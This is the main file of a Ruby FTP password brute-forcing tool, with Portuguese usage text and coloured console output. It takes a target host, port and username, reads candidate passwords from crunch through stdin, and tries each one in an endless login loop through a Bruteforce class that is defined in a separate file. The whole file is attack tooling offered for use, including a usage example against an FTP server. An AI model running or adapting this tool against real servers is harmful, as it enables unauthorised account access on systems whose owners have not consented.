#coding:utf-8
load "ftp.rb"
load "cor.rb"
system("clear")

cor = Cor.new()
if ARGV.length < 3
	puts "#{cor.branco}--------------------------------------------------------------------------"
	puts "#{cor.verde}USAR: crunch <min> <max> [options] | ruby main.rb [HOST] [PORTA] [USUÁRIO]"
	puts "#{cor.branco}--------------------------------------------------------------------------"
	puts "#{cor.verde}Ex: crunch 4 8 possiveiscaracteres | ruby main.rb servidorFTP 21 Anonymous"
	puts "#{cor.branco}--------------------------------------------------------------------------"
	exit()	
end

begin
host = ARGV[0]
porta = ARGV[1]
user = ARGV[2]

bf = Bruteforce.new(host,porta,user)
puts "#{cor.banner}"
puts "#{cor.cyan}[#{cor.amarelo}INICIANDO BRUTEFORCE#{cor.cyan}]"
puts "\n#{cor.cyan}[#{cor.vermelho}+#{cor.cyan}]#{cor.branco} Servidor: #{cor.cyan}#{host}"
puts "#{cor.cyan}[#{cor.vermelho}+#{cor.cyan}]#{cor.branco} Porta   : #{cor.cyan}#{porta}"
puts "#{cor.cyan}[#{cor.vermelho}+#{cor.cyan}]#{cor.branco} Usuário : #{cor.cyan}#{user}"
puts "#{cor.branco}==============================\n\n"
while true
	bf.initServer()
	s = String(STDIN.gets.chomp)
	bf.senha=(s)
	bf.login()
end

rescue Exception => e
	puts "#{cor.vermelho}#{e}#{cor.branco}"

end
